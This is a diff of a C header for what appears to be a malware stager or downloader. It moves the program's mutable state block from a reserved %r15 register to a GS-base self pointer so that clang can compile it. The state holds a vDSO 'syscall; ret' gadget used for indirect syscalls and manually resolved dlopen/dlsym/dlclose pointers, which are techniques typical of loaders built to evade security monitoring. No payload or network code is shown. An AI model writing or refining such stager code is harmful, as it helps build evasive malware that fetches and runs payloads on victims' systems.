@@ -9,11 +9,10 @@
  * cannot be written once it is running, mutable globals cannot live in .data.
  *
  * Instead, downloader_main() calls stager_state_init() once, before any
- * syscall. That mmap's a dedicated read/write page for the single mutable
- * state block and binds it to %r15. The whole stager is compiled with
- * -ffixed-r15 so no generated code ever clobbers that register, giving every
- * translation unit a stable pointer to the writable state block via
- * get_stager_state().
+ * syscall. That mmaps a dedicated read/write page for the single mutable
+ * state block and installs its address as the GS base. get_stager_state()
+ * reads the self pointer at %gs:0, so any compiler can address the block
+ * without reserving a general-purpose register (clang has no -ffixed-r15).
  */
 
 typedef void *(*dlopen_fn)(const char *, int);
@@ -21,8 +20,9 @@ typedef void *(*dlsym_fn)(void *, const char *);
 typedef int (*dlclose_fn)(void *);
 
 struct stager_state {
-  void *syscall_gadget; /* resolved vDSO `syscall; ret` gadget */
-  long dl_ready;        /* 1 = dl* cache not yet resolved */
+  struct stager_state *self; /* %gs:0 points back here (see get_stager_state) */
+  void *syscall_gadget;      /* resolved vDSO `syscall; ret` gadget */
+  long dl_ready;             /* 1 = dl* cache not yet resolved */
   dlopen_fn dlopen_;
   dlsym_fn dlsym_;
   dlclose_fn dlclose_;
@@ -31,15 +31,18 @@ struct stager_state {
 /* Sentinel value for syscall_gadget before init_indirect_syscalls(). */
 #define _SYSCALL_GADGET_UNRESOLVED ((void *)1)
 
-/* Read the state block bound to %r15. */
+/* Read the state block installed as the GS base by stager_state_init().
+ * %gs:0 is the block's self pointer, so no general-purpose register is
+ * reserved and every translation unit gets the same stable address. */
 static inline struct stager_state *get_stager_state(void) {
   struct stager_state *st;
-  __asm__ __volatile__("mov %%r15, %0" : "=r"(st));
+  __asm__ __volatile__("movq %%gs:0, %0" : "=r"(st));
   return st;
 }
 
-/* mmap a dedicated RW state page, initialise it, and bind it to %r15.
- * Must be called once at the top of downloader_main, before any syscall. */
+/* mmap a dedicated RW state page, initialise it, and install it as the GS
+ * base. Must be called once at the top of downloader_main, before any
+ * syscall. */
 void stager_state_init(void);
 
 #endif /* STAGER_STATE_H */
